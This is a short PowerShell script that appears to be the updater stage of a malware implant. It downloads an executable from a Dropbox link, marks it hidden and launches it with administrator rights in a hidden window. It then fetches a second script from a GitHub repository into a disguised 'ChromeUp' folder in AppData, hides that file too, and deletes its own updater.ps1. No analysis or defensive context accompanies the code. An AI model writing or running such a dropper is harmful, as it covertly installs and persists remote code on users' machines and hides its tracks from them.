#sleep
start-sleep 10

#change directory
cd $env:temp/sVBXKuz

#download new file
Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/p5ifhyuv4p1ui2ecolmoz/wsappa-1.6.exe?rlkey=duuxz6c3b7168p2r6iu3ozjaw&dl=0" -OutFile wsappa_new.exe
Copy-Item -Path .\wsappa_new.exe -Destination .\wsappa.exe -Force

#delete old file
Remove-Item .\wsappa_new.exe


#sleep
start-sleep 2


# Set "Hidden" attribute on the file
$filePath = Join-Path $env:temp\sVBXKuz "wsappa.exe"
$attr = [System.IO.FileAttributes]::Hidden
[System.IO.File]::SetAttributes($filePath, $attr)

#start new file
Start-Process -FilePath "$env:temp/sVBXKuz/wsappa.exe" -Verb RunAs -WindowStyle Hidden

#change directory
cd $env:appdata/ChromeUp/

#download new backup
$url = "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/backup.ps1"
$response = Invoke-WebRequest -Uri $url
$response.Content | Set-Content -Path "backup.ps1"

# Set "Hidden" attribute on the file
$filePath = Join-Path $env:appdata\ChromeUp "backup.ps1"
$attr = [System.IO.FileAttributes]::Hidden
[System.IO.File]::SetAttributes($filePath, $attr)

#sleep
start-sleep 2

#clean uo
powershell.exe /c Remove-Item $env:temp/sVBXKuz/updater.ps1
